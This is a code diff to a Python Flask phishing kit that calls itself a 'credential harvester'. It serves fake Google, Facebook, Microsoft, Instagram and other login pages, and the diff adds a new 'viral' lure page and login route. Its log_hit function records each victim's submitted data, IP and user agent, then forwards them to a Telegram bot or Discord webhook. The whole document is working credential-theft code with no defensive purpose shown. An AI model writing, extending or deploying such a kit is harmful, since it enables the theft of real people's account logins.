@@ -73,15 +73,12 @@ def log_hit(data: dict):
 
     record = {"time": ts, "ip": ip, "ua": ua, **data}
 
-    # Always write to file
     fname = os.path.join(CAPTURE_DIR, f"{CURRENT_TEMPLATE}_{ts[:10]}.log")
     with open(fname, "a") as f:
         f.write(json.dumps(record) + "\n")
 
-    # Console
     print(f"{Fore.GREEN}[+] CAPTURE{Style.RESET_ALL} {ip} -> {data}")
 
-    # Telegram
     if config.CAPTURE_MODE == "telegram" and config.TELEGRAM_BOT_TOKEN:
         msg = f"*Capture* [{CURRENT_TEMPLATE}]\nIP: `{ip}`\n" + "\n".join(
             f"{k}: `{v}`" for k, v in data.items()
@@ -95,7 +92,6 @@ def log_hit(data: dict):
         except Exception as e:
             print(f"{Fore.RED}[!] Telegram send failed: {e}")
 
-    # Discord
     if config.CAPTURE_MODE == "discord" and config.DISCORD_WEBHOOK:
         content = f"**Capture** [{CURRENT_TEMPLATE}] IP: `{ip}`\n" + "\n".join(
             f"{k}: `{v}`" for k, v in data.items()
@@ -109,6 +105,16 @@ def log_hit(data: dict):
 @app.route("/", methods=["GET"])
 def index():
     return render_template(f"{CURRENT_TEMPLATE}/index.html")
+
+
+@app.route("/viral")
+def viral_landing():
+    return render_template("viral/index.html")
+
+
+@app.route("/viral/login")
+def viral_login():
+    return render_template("viral/login.html")
 
 
 @app.route("/login", methods=["POST"])
@@ -135,7 +141,7 @@ def main():
 
     parser = argparse.ArgumentParser(description="phishkit — credential harvester")
     parser.add_argument("-t", "--template", default="google",
-                        choices=["google", "facebook", "messenger", "microsoft", "instagram", "generic"],
+                        choices=["google", "facebook", "messenger", "viral", "microsoft", "instagram", "generic"],
                         help="Login page template to serve")
     parser.add_argument("-p", "--port", type=int, default=config.PORT,
                         help="Port to listen on")
